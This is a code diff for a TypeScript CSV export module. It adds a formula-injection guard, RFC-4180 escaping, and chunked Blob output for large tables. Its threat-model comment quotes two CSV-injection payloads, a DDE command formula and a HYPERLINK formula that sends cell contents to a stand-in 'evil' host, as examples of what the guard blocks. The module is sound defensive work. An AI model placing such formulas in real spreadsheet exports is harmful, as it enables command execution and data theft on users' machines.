@@ -1,15 +1,14 @@
-// 🔴 REAL LOGIC (not a stub). CSV-injection guard + RFC-4180 escaping + BOM.
-//
-// This is small, security-critical, and platform-independent, so it is
-// implemented for real in the scaffold (the brief explicitly permits it). The
-// only thing still mocked around it is the DOM extraction that produces the cell
-// strings (utils/table-extract.ts) — this module operates on strings and is fully
-// exercised by the preview's "raw bytes" tab against the mock table.
+// 🔴 CSV-injection guard + RFC-4180 escaping + BOM. Security-critical.
 //
 // Threat model (design §8.3): cell values come from an ARBITRARY web page, i.e.
 // untrusted input. A cell beginning with `= + - @` (or TAB/CR) is interpreted as
 // a FORMULA by Excel/LibreOffice/Sheets, so `=cmd|'/c calc'!A0` or
 // `=HYPERLINK("http://evil/?"&A1)` executes / exfiltrates on open.
+//
+// The exception that everyone else gets wrong: a cell that is a VALID NUMBER
+// (`-5`, `+3.14`, `-1 234,56`) starts with a dangerous leader but is not a
+// formula. Escaping it turns every negative rate in an accounting table into
+// `'-5`. `isPlainNumber` is what prevents that (see the guard test in the PR).
 
 import type { CsvDelimiter, CsvEol, FormulaGuard } from './types';
 
@@ -33,11 +32,16 @@ export function isPlainNumber(raw: string): boolean {
   return /^[+-]?\d+(?:[.,]\d+)?$/.test(s);
 }
 
-/** Does this cell trigger the formula guard? (leading dangerous char, not a number) */
+/** Does this cell trigger the formula guard? (leading dangerous char, not a number)
+ *
+ * The leader is tested on the RAW first character, never on a trimmed copy: TAB
+ * and CR are themselves dangerous leaders (some importers strip them, then see
+ * the formula), so `trimStart()` here would delete the very characters the set
+ * exists to catch. A genuine leading SPACE, by contrast, makes every spreadsheet
+ * treat the cell as text — so `" =1+1"` is correctly NOT flagged. */
 export function isFormulaRisk(raw: string): boolean {
-  const t = raw.trimStart();
-  if (t === '') return false;
-  if (!DANGEROUS_LEADERS.has(t[0]!)) return false;
+  if (raw === '') return false;
+  if (!DANGEROUS_LEADERS.has(raw[0]!)) return false;
   return !isPlainNumber(raw);
 }
 
@@ -87,32 +91,62 @@ export interface CsvOptions {
 }
 
 /**
- * Build the exact CSV text (what the "raw bytes" preview tab shows and what the
- * file will contain). REAL: guard → RFC-4180 quote → join with the chosen EOL →
- * optional `sep=` line → optional BOM. Rows arrive already extracted (the
- * extraction itself is the mocked part).
+ * Build the CSV as an ARRAY OF CHUNKS, ready for `new Blob(parts)`.
+ *
+ * ⚠️ Never `s += cell` (design §9.1): string concatenation over 60 000 cells is
+ * O(n²). We build per-row strings, group them into chunks, and hand the array
+ * straight to `Blob` — no intermediate giant string ever exists.
  */
-export function buildCsv(rows: string[][], opts: CsvOptions): string {
+export function buildCsvParts(
+  rows: readonly string[][],
+  opts: CsvOptions,
+  chunkRows = 500,
+): string[] {
   const delim = resolveDelimiter(opts.delimiter, opts.locale);
   const eol = opts.eol === 'crlf' ? '\r\n' : '\n';
-
-  const lines = rows.map((row) =>
-    row
-      .map((cell) => encodeField(guardValue(cell, opts.formulaGuard), delim))
-      .join(delim),
-  );
 
   const parts: string[] = [];
   if (opts.encoding === 'utf8-bom') parts.push(BOM);
   // ⚠️ `sep=;` helps Excel but breaks pandas/Sheets (design §2.3) — opt-in only.
   if (opts.sepLine) parts.push(`sep=${delim}${eol}`);
-  parts.push(lines.join(eol));
-  return parts.join('');
+
+  let buf: string[] = [];
+  for (let i = 0; i < rows.length; i++) {
+    buf.push(
+      rows[i]!
+        .map((cell) => encodeField(guardValue(cell, opts.formulaGuard), delim))
+        .join(delim),
+    );
+    if (buf.length >= chunkRows) {
+      parts.push(buf.join(eol) + (i + 1 < rows.length ? eol : ''));
+      buf = [];
+    }
+  }
+  if (buf.length) parts.push(buf.join(eol));
+  return parts;
+}
+
+/**
+ * The exact CSV text — what the dialog's "raw bytes" tab shows and what the file
+ * contains, byte for byte ("the preview IS the spec", design §6.8). Only used for
+ * the (short) preview and by tests; the file itself goes through `buildCsvParts`.
+ */
+export function buildCsv(rows: readonly string[][], opts: CsvOptions): string {
+  return buildCsvParts(rows, opts).join('');
 }
 
 /** How many cells the guard would escape — the exact count the preview shows. */
-export function countGuarded(rows: string[][]): number {
+export function countGuarded(rows: readonly string[][]): number {
   let n = 0;
   for (const row of rows) for (const cell of row) if (isFormulaRisk(cell)) n++;
   return n;
 }
+
+/** MIME types we hand to `new Blob`. `charset=utf-8` is not optional: without it
+ *  (and without the BOM) Excel reads a Cyrillic CSV as mojibake. */
+export const MIME: Record<string, string> = {
+  csv: 'text/csv;charset=utf-8',
+  md: 'text/markdown;charset=utf-8',
+  txt: 'text/plain;charset=utf-8',
+  xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+};
